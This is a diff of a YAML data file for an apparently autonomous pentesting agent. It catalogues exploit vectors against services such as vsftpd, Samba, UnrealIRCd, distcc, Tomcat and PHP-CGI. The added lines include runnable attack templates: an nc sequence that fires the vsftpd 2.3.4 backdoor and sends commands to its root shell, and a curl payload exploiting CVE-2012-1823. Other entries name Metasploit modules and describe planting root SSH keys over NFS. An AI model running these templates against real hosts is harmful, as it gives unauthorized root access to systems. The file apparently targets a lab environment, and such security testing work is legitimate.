@@ -1,114 +1,292 @@
-# How to reach a service that the DEFAULT bind-shell probe cannot.
+# How to reach / exploit a service — as DATA, for both advice and independent attempts.
 #
 # WHY THIS IS DATA
-#   The access probe opens a TCP socket and sends `id`. That only works on a raw
-#   bind shell. A real service (FTP, rsh, an RPC program, a backdoor that needs a
-#   trigger) is dead to that probe even when there is a real path in — the path
-#   just is not the default one. This file records, as DATA, the NON-DEFAULT
-#   option/trigger each service needs, the same way tool_options.yaml records ssh
-#   algorithm syntax. It is a fact ("vsftpd 2.3.4 has a backdoor triggered by a
-#   smiley in USER"), checkable against the exploit's own description.
+#   The default bind-shell probe opens a socket and sends `id`; that only speaks to
+#   a raw bind shell. A real service (FTP with a trigger backdoor, rsh, an RPC
+#   program, Samba usermap, a web app) is dead to that probe even when there is a
+#   real path in — the path is just not the default. This file records each known
+#   vector as a fact: how to reach it (advice) AND, where we can, the runnable
+#   NON-MSF command to attempt it plus how to tell it worked. It is the single
+#   source of truth for the dead-port advisor (etl/dead_port_advisor.py) and the
+#   independent vector-attempt generator (autogen_agents/langgraph_engine.py
+#   _service_vector_tests). Whether a vector works HERE stays measured, never
+#   asserted.
 #
-#   It does NOT decide to run anything. It answers the operator's question "this
-#   port is dead to the probe — is there a way in, and what is it?" so
-#   enumeration is not stuck on the default. Whether a method actually works
-#   HERE stays measured, not asserted.
+# MATCHING (etl/dead_port_advisor.match_method, most-specific wins)
+#   `service` (nmap service name) and/or `product` substring and/or `version`
+#   regex. product+version beats product beats service alone.
 #
-# MATCHING
-#   Each entry matches on `service` (nmap's service name) and/or a `product`
-#   substring and an optional `version` regex. The most specific match wins
-#   (product+version beats service alone). `id` is a stable key for the advice.
+# ADVISOR FIELDS   method, summary, steps (prose), tool, opens, caution.
+# VECTOR FIELDS (independent attempts)
+#   port     : the service's conventional port (emit hint when nmap mislabels it)
+#   msf      : Metasploit module for the MSF-seed path (dispatch=metasploit)
+#   dispatch : how to attempt — 'command' (non-MSF, primary) | 'metasploit' | 'webshell'
+#   attempt  : runnable NON-MSF command template; {target} {port} {lhost} {lport}
+#              {opens} are substituted. Runs in the kali container via the
+#              scope-gated /vectors/run listener endpoint (NOT the allowlisted
+#              /tools/execute — offensive commands need shell metacharacters).
+#   success  : assertion evaluated on the output — {expect_shell: true} or
+#              {expect_regex: "..."} (shapes db_utils.record_test_run understands)
+#   opens    : port the vector yields a shell on, when different from `port`
+#   mutates  : true when the attempt changes target state (nfs key write, backdoor)
 #
-# FIELDS
-#   method   : short label for the non-default approach
-#   summary  : one line an operator reads
-#   steps    : the concrete non-default actions/options (list)
-#   tool     : a ready tool/module that already implements it, if any
-#   opens    : port the method yields access on, when different from the probed one
-#   caution  : anything destructive/stateful about it
+# A vector may carry BOTH `msf` and `attempt`: the generator queues the non-MSF
+# command AND an MSF seed, so coverage never depends on the MSF planner alone.
 
 version: 1
 
 methods:
 
+  # ── FTP / vsftpd 2.3.4 backdoor ───────────────────────────────────────────
   - id: vsftpd_234_backdoor
     service: ftp
     product: vsftpd
     version: '^2\.3\.4'
+    port: 21
     method: backdoor-trigger
     summary: >-
-      vsftpd 2.3.4 ships a backdoor: a USER whose name ends in ":)" opens a root
-      shell on port 6200. A raw connect to 6200 is silent because it only spawns
-      AFTER the port-21 trigger.
+      vsftpd 2.3.4 ships a backdoor: a USER ending in ":)" opens a root shell on
+      6200. A raw connect to 6200 is silent — it spawns only AFTER the 21 trigger.
     steps:
       - "connect to 21, send `USER anything:)` then `PASS anything`"
-      - "the backdoor opens a root shell on 6200 — connect there for the shell"
-    tool: "metasploit exploit/unix/ftp/vsftpd_234_backdoor"
+      - "connect to 6200 for the root shell"
+    tool: "nc"
+    msf: "exploit/unix/ftp/vsftpd_234_backdoor"
+    dispatch: command
+    attempt: "printf 'USER x:)\\r\\nPASS x\\r\\n' | nc -w 5 {target} 21 >/dev/null 2>&1; sleep 1; printf 'id; uname -a\\n' | nc -w 8 {target} 6200"
+    success: {expect_shell: true}
     opens: 6200
+    mutates: true
     caution: >-
       one-shot per service lifetime; once fired it can enter a
-      priv_sock_get_result stuck state until vsftpd is restarted on the target.
+      priv_sock_get_result stuck state until vsftpd is restarted.
 
+  # ── Samba usermap_script (CVE-2007-2447) → root ───────────────────────────
+  - id: samba_usermap
+    service: netbios-ssn
+    product: samba
+    port: 445
+    method: usermap-rce
+    summary: >-
+      Samba 3.0.20-3.0.25 `usermap script` — a shell metacharacter in the
+      username is run by the server as root (CVE-2007-2447). Instant root.
+    steps:
+      - "authenticate with a username containing a `nohup ...` command substitution"
+    tool: "metasploit exploit/multi/samba/usermap_script"
+    msf: "exploit/multi/samba/usermap_script"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── r-services (rsh/rexec/rlogin) → root ──────────────────────────────────
   - id: rservices_rsh
-    service: shell
+    service: [exec, login, shell]   # r-services: 512/exec 513/login 514/shell
+    port: 514
     method: rservices
     summary: >-
-      An r-services shell (rsh/rexec) has its own wire protocol
-      (\0localuser\0remoteuser\0command\0) — sending `id` over a raw socket does
-      nothing. It needs an rsh client and a trust relationship.
+      r-services trust (`+ +` in .rhosts) lets `rsh -l root` run commands as root.
+      Its own wire protocol, so a raw `id` over nc does nothing.
     steps:
-      - "use an rsh/rlogin client, not raw nc"
-      - "Metasploitable trusts `+ +` in .rhosts, so `rsh -l root <host> id` works"
-    tool: "metasploit auxiliary/scanner/rservices/rsh_login"
+      - "rsh -l root {target} id   (needs an rsh client — Stage 2)"
+    tool: "rsh"
+    msf: "auxiliary/scanner/rservices/rsh_login"
+    dispatch: metasploit          # Stage 2 adds a native `attempt` once rsh is installed
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── NFS no_root_squash → filesystem → root ────────────────────────────────
+  - id: nfs_no_root_squash
+    service: nfs
+    port: 2049
+    method: nfs-showmount
+    summary: >-
+      An NFS export with no_root_squash lets a client write files owned by root —
+      plant an authorized_keys and ssh in as root. Stage 1 enumerates the exports.
+    steps:
+      - "showmount -e {target}   → look for a world-rw export"
+      - "mount it, write ~root/.ssh/authorized_keys, ssh root@ (Stage 2, mutating)"
+    tool: "showmount"
+    msf: "auxiliary/scanner/nfs/nfsmount"
+    dispatch: command
+    attempt: "showmount -e {target}"
+    success: {expect_regex: "(?i)/[a-z].*(\\*|everyone|/)"}
+    mutates: false
+
+  # ── UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) → shell ───────────────────
+  - id: unreal_ircd_backdoor
+    service: irc
+    product: unrealircd
+    port: 6667
+    method: irc-backdoor
+    summary: "UnrealIRCd 3.2.8.1 shipped a backdoor: `AB;<cmd>` runs <cmd>."
+    steps: ["send `AB; <cmd>` on the IRC port"]
+    tool: "metasploit exploit/unix/irc/unreal_ircd_3281_backdoor"
+    msf: "exploit/unix/irc/unreal_ircd_3281_backdoor"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── distccd (CVE-2004-2687) → shell ───────────────────────────────────────
+  - id: distccd_exec
+    service: distccd
+    port: 3632
+    method: distcc-rce
+    summary: "distccd runs attacker-supplied compile commands — unauthenticated RCE."
+    steps: ["distcc_exec / a crafted DISTCC job (native client Stage 2)"]
+    tool: "metasploit exploit/unix/misc/distcc_exec"
+    msf: "exploit/unix/misc/distcc_exec"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── Java RMI registry → RCE ───────────────────────────────────────────────
+  - id: java_rmi_server
+    service: java-rmi
+    port: 1099
+    method: rmi-rce
+    summary: "Default Java RMI registry allows remote class loading → RCE."
+    steps: ["java_rmi_server (loads a stub from our HTTP)"]
+    tool: "metasploit exploit/multi/misc/java_rmi_server"
+    msf: "exploit/multi/misc/java_rmi_server"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── Distributed Ruby (drb) → RCE ──────────────────────────────────────────
+  - id: drb_remote
+    service: drb
+    port: 8787
+    method: drb-rce
+    summary: "Ruby DRb exposes eval → remote code execution."
+    steps: ["drb_remote_codeexec"]
+    tool: "metasploit exploit/linux/misc/drb_remote_codeexec"
+    msf: "exploit/linux/misc/drb_remote_codeexec"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── VNC weak/none auth ────────────────────────────────────────────────────
+  - id: vnc_login
+    service: vnc
+    port: 5900
+    method: vnc-login
+    summary: "VNC often has a weak/blank password → interactive desktop."
+    steps: ["test password `password` and blank"]
+    tool: "metasploit auxiliary/scanner/vnc/vnc_login"
+    msf: "auxiliary/scanner/vnc/vnc_login"
+    dispatch: metasploit
+    success: {expect_regex: "(?i)(login successful|authentication.*success)"}
+    mutates: false
+
+  # ── MySQL weak/blank root ─────────────────────────────────────────────────
+  - id: mysql_weak
+    service: mysql
+    port: 3306
+    method: db-login
+    summary: "MySQL commonly allows root with a blank/weak password."
+    steps: ["mysql -h {target} -u root  (blank), then read the DB"]
+    tool: "hydra"
+    msf: "auxiliary/scanner/mysql/mysql_login"
+    dispatch: metasploit
+    success: {expect_regex: "(?i)(login successful|access granted)"}
+    mutates: false
+
+  # ── PostgreSQL weak creds ─────────────────────────────────────────────────
+  - id: postgres_weak
+    service: postgresql
+    port: 5432
+    method: db-login
+    summary: "PostgreSQL commonly allows postgres:postgres."
+    steps: ["test postgres:postgres"]
+    tool: "hydra"
+    msf: "auxiliary/scanner/postgres/postgres_login"
+    dispatch: metasploit
+    success: {expect_regex: "(?i)(login successful|access granted)"}
+    mutates: false
+
+  # ── Tomcat manager WAR deploy → RCE ───────────────────────────────────────
+  - id: tomcat_mgr
+    service: http
+    product: tomcat
+    port: 8180
+    method: tomcat-war
+    summary: "Tomcat manager with weak creds (tomcat:tomcat) → deploy a WAR → RCE."
+    steps: ["auth to /manager, deploy a jsp WAR, invoke it"]
+    tool: "metasploit exploit/multi/http/tomcat_mgr_deploy"
+    msf: "exploit/multi/http/tomcat_mgr_deploy"
+    dispatch: metasploit
+    success: {expect_shell: true}
+    mutates: true
+
+  # ── Web: PHP-CGI argument injection (CVE-2012-1823) → RCE ─────────────────
+  - id: php_cgi_argument_injection
+    service: http
+    product: apache
+    port: 80
+    method: web-rce
+    summary: >-
+      Apache 2.2.x + php-cgi (CVE-2012-1823): query-string argument injection runs
+      PHP → RCE. Non-MSF: curl a crafted query string that forces php://input as
+      auto_prepend_file, POSTing PHP that runs `id`.
+    steps: ["POST php://input with auto_prepend_file / allow_url_include, run id"]
+    tool: "curl"
+    dispatch: command
+    attempt: >-
+      curl -s --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded'
+      "http://{target}:{port}/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
+      --data "<?php system('id'); ?>"
+    msf: "exploit/multi/http/php_cgi_arg_injection"
+    success: {expect_shell: true}
+    mutates: false
+
+  # ── Web enumeration fallback (no specific app vector) ─────────────────────
+  - id: http_web
+    service: http
+    method: web-enumeration
+    summary: "Generic HTTP target — drive the web pipeline, then attack findings."
+    steps: ["web pipeline (gobuster/katana/nikto/nuclei/zap); then sqlmap/LFI on findings"]
+    tool: "web_scanner pipeline"
+    dispatch: command
+    attempt: "nuclei -u http://{target}:{port}/ -severity critical,high -silent"
+    success: {expect_regex: "\\[(critical|high)\\]"}
+    mutates: false
+
+  - id: https_web
+    service: https
+    method: web-enumeration
+    summary: "As http_web, over TLS."
+    steps: ["web pipeline against the https URL"]
+    tool: "web_scanner pipeline"
+    dispatch: command
+    attempt: "nuclei -u https://{target}:{port}/ -severity critical,high -silent"
+    success: {expect_regex: "\\[(critical|high)\\]"}
+    mutates: false
+
+  # ── RPC directory (rpcbind / statd) — enumeration lead, not a shell ───────
+  - id: rpcbind
+    service: rpcbind
+    port: 111
+    method: rpc
+    summary: "rpcbind lists RPC programs (NFS, statd) to follow — not a shell itself."
+    steps: ["rpcinfo -p {target}"]
+    tool: "rpcinfo"
+    dispatch: command
+    attempt: "rpcinfo -p {target}"
+    success: {expect_regex: "(nfs|mountd|status|nlockmgr)"}
+    mutates: false
 
   - id: rpc_status
     service: status
     method: rpc
     summary: >-
-      An RPC `status` program (rpc.statd) reached through rpcbind. It is not a
-      shell and its port is rpcbind-assigned, so it moves between scans — probe
-      it through rpcbind (111), not the fixed high port.
+      An RPC `status` program (rpc.statd) reached through rpcbind — not a shell,
+      and its port is rpcbind-assigned (moves between scans), so enumerate via
+      rpcbind (111), not the fixed high port.
     steps:
-      - "enumerate with `rpcinfo -p <host>` (port 111) to find the live statd port"
-      - "target rpc.statd's format-string bug for RCE where the version is vulnerable"
-    tool: "rpcinfo / nmap --script nfs-* ; metasploit for statd RCE"
-
-  - id: rpcbind
-    service: rpcbind
-    method: rpc
-    summary: >-
-      rpcbind (portmapper) is the directory for RPC programs, not a shell.
-      Enumerate the programs it exposes and target those.
-    steps:
-      - "`rpcinfo -p <host>` lists program/version/port"
-      - "follow NFS (mountd/nfs) or statd from there"
-    tool: "rpcinfo ; nmap --script rpcinfo,nfs-showmount"
-
-  - id: http_web
-    service: http
-    method: web-enumeration
-    summary: >-
-      An HTTP service is a web target, never a shell — the `id` probe just makes a
-      malformed request. Enumeration is the web pipeline, not a bind-shell probe.
-    steps:
-      - "run the web pipeline (gobuster, katana, nikto, nuclei, ZAP)"
-      - "for Apache 2.2.x + php-cgi, check CVE-2012-1823 (argument injection RCE)"
-    tool: "web_scanner pipeline"
-
-  - id: https_web
-    service: https
-    method: web-enumeration
-    summary: "As http, over TLS — a web target, not a shell."
-    steps:
-      - "run the web pipeline against the https URL"
-    tool: "web_scanner pipeline"
-
-  - id: distccd
-    service: distccd
-    method: exploit
-    summary: >-
-      distccd allows remote command execution by design when misconfigured
-      (CVE-2004-2687) — a shell path, but through the distcc protocol, not raw id.
-    steps:
-      - "use the distcc_exec module; the port is often an ephemeral one"
-    tool: "metasploit exploit/unix/misc/distcc_exec"
+      - "rpcinfo -p {target} (port 111) to find the live statd port"
+      - "target rpc.statd's format-string bug where the version is vulnerable"
+    tool: "rpcinfo"
+    dispatch: command
+    attempt: "rpcinfo -p {target}"
+    success: {expect_regex: "(status|nlockmgr)"}
+    mutates: false
